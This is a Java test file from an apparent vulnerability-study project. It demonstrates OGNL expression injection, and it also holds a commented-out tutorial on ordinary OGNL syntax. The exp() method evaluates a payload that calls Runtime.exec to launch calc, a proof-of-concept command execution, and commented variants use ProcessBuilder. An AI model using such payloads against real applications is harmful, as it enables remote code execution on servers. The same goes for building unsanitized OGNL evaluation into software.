package com.r17a.commonvuln.injection.expression.ognl;

import com.r17a.commonvuln.injection.expression.ognl.bean.School;
import com.r17a.commonvuln.injection.expression.ognl.bean.SchoolMaster;
import com.r17a.commonvuln.injection.expression.ognl.bean.Student;
import ognl.*;

import java.io.IOException;
import java.lang.reflect.Member;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Map;

public class OgnlTest {
    public static void main(String[] args) throws Exception {
        OgnlTest ognlTest = new OgnlTest();
//        ognlTest.operatorsTest();
        ognlTest.exp();
    }


    /**
     * 漏洞测试
     * */
    public void exp() throws OgnlException {
        MemberAccess memberAccess = new AbstractMemberAccess() {
            @Override
            public boolean isAccessible(Map context, Object target, Member member, String propertyName) {
                int modifiers = member.getModifiers();
                return Modifier.isPublic(modifiers);
            }
        };
        OgnlContext context = (OgnlContext) Ognl.createDefaultContext(this, memberAccess, new DefaultClassResolver(),new DefaultTypeConverter());
//        OgnlContext context = new OgnlContext();
        Ognl.getValue("@java.lang.Runtime@getRuntime().exec(\"calc\")", context, context.getRoot());
//        Ognl.getValue("(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start()", context, context.getRoot());
        
    }

    /**
     * 漏洞测试: ognl低版本 可用（eg：ognl版本：2.7.3）
     * TODO 取消注释
     * */
    public void expLowVersion() throws OgnlException {
//        OgnlContext context = new OgnlContext();
//        Ognl.getValue("@java.lang.Runtime@getRuntime().exec(\"calc\")", context, context.getRoot());
//        Ognl.getValue("(new java.lang.ProcessBuilder(new java.lang.String[]{\"calc\"})).start()", context, context.getRoot());

    }



    /**
     * 测试ognl表达式的一些符号
     * */
//    public void operatorsTest() throws OgnlException {
//        // 创建Student对象
//        School school = new School();
//        school.setName("tsinghua");
//        school.setSchoolMaster(new SchoolMaster("wanghua"));
//        Student student1 = new Student();
//        student1.setName("xiaoming");
//        student1.setSchool(school);
//        Student student2 = new Student();
//        student2.setName("zhangsan");
//        student2.setSchool(school);
//
//        // 创建上下文环境
//        OgnlContext context = new OgnlContext();
//        // 设置跟对象root
//        context.setRoot(student1);
//        // 添加容器变量
//        context.put("student2", student2);
//        // 获取ognl的root相关值
//        Object name1 = Ognl.getValue("name", context, context.getRoot());
//        Object school1 = Ognl.getValue("school.name", context, context.getRoot());
//        Object schoolMaster1 = Ognl.getValue("school.schoolMaster.name", context, context.getRoot());
//        System.out.println(name1 + ":学校-" + school1 + ",校长-" + schoolMaster1);
//        // 获取ognl容器变量相关值，测试 # .
//        Object name2 = Ognl.getValue("#student2.name", context, context.getRoot());
//        Object school2 = Ognl.getValue("#student2.school.name", context, context.getRoot());
//        Object schoolMaster2 = Ognl.getValue("#student2.school.schoolMaster.name", context, context.getRoot());
//        System.out.println(name2 + ":学校-" + school2 + ",校长-" + schoolMaster2);
//        System.out.println(Ognl.getValue("#student2['name']", context, context.getRoot()));
//        Ognl.getValue("#student2.takingClasses(\"英语\")", context, context.getRoot());
//        // 测试@
//        System.out.println(Ognl.getValue("@java.lang.Math@abs(-111)", context, context.getRoot()));
//        // setValue
//        Ognl.setValue("#student3", context, context.getRoot(), new Student());
//        Ognl.setValue("#student3.name", context, context.getRoot(), "lisi");
//        Ognl.setValue("#student3.school", context, context.getRoot(), new School());
//        Ognl.setValue("#student3.school.name", context, context.getRoot(), "peking");
//        Ognl.setValue("#student3.school.schoolMaster", context, context.getRoot(), new SchoolMaster());
//        Ognl.setValue("#student3.school.schoolMaster.name", context, context.getRoot(), "wangwu");
//        System.out.println(Ognl.getValue("#student3.school.name", context, context.getRoot()));
//        // new
//        System.out.println(Ognl.getValue("new java.lang.String(\"testnew\")", context, context.getRoot()));
//        // 集合相关操作
//        System.out.println(Ognl.getValue("new int[]{1,3,5}[0]", context, context.getRoot()));
//        System.out.println(Ognl.getValue("#{\"name\":\"xiaoming\",\"school\":\"tsinghua\"}[\"school\"]", context, context.getRoot()));
//        context.put("verifyStatus", "1");
//        System.out.println(Ognl.getValue("#verifyStatus == 1", context, context.getRoot()));
//    }

}
